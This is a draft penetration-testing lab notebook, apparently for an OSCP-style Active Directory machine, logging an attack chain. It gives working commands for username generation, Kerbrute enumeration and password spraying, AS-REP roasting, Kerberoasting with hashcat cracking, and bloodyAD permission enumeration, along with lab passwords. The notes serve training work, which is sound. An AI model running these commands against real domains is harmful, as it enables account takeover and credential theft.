---
draft: true
---

# System Information
OS: Windows

Architecture: x64

IP: 192.168.156.21

# Local Users/Credentials

---
# Service Discovery

`scan --autorecon`
## Open Ports & Priority

![[Pasted image 20260721233500.png]]

### 80/tcp HTTP

Server: IIS/10.0

Email from page: info@nagoya-industries.com

`sudo $(echo $IP nagoya-industries.com >> /etc/hosts)`

/Team gives a list of names. Maybe we can use this to brute force a login?

Copy/paste/clean into `names.txt`.

Generate more realistic potential usernames:

`./username-anarchy/username-anarchy -i ./names.txt > potential_users.txt`

Check which are valid with Kerbrute:

`kerbrute_linux_amd64 userenum -d nagoya-industries.com --dc 192.168.156.21 ./potential_users.txt`

![[Pasted image 20260722000329.png]]

Check for asreproastable users:

`netexec ldap 192.168.156.21 -u users.txt -p '' --asreproast asrep_hashes.txt`

![[Pasted image 20260722002459.png]]

No luck. Have to spray for passwords. Got stuck and looked at writeup for this part.

Unfortunately, while the passwords we're supposed to find are weak, they aren't in any of the default wordlists on Kali. It is contained in `seclists` at Passwords/corportate_passwords.txt... but still, spraying 1761 passwords against 28 user accounts isn't really practical in a lab setting. 

![[Pasted image 20260722003001.png]]

Assuming we somehow knew that Summer2023 was going to be a valid password, we could spray with:

`kerbrute_linux_amd64 passwordspray -d nagoya-industries.com --dc nagoya-industries.com users.txt Summer2023`

![[Pasted image 20260722004631.png]]

Dump users

![[Pasted image 20260722005154.png]]

Kerberoast, get hashes for svc_helpdesk and svc_mssql:

![[Pasted image 20260722005335.png]]

Crack:

`hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt`

Cracks for svc_mssql as `Service1`.

No obviously useful access from this new account, checking with nxc.

Enumerate LDAP/AD further?

`bloodyAD -d nagoya-industries.com -u 'fiona.clark' -p 'Summer2023' --host nagoya-industries.com get writable`

![[Pasted image 20260722014141.png]]

We can modify the DACL and owner of svc_helpdesk, iain.white, joanna.wood, or bethan.webster. 

What can they do?

`bloodyad get object svc_helpdesk`

`bloodyAD get membership alice`

### 53/tcp DNS

### 88/tcp Kerberos

### 135/tcp MSRPC

### 139/tcp SMB

### 389/tcp LDAP

### 445/tcp SMB

No luck as anonymous. Guest account is disabled.

![[Pasted image 20260722001039.png]]

### 464/tcp Service

### 593/tcp Service

### 636/tcp LDAP

### 3268/tcp Service

### 3269/tcp Service

### 3389/tcp RDP

### 5985/tcp WinRM

### 9389/tcp Service

### 49666/tcp Service

### 49667/tcp Service

### 49675/tcp Service

### 49676/tcp Service

### 49678/tcp Service

### 49691/tcp Service

## 49698/tcp Service

### 49717/tcp Service



# Service Enumeration

# Initial Access

# Privilege Escalation

# Proof Screenshots (local.txt / proof.txt)
`type` or `cat` flag and [include IP address in screenshot](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide#screenshot-requirements)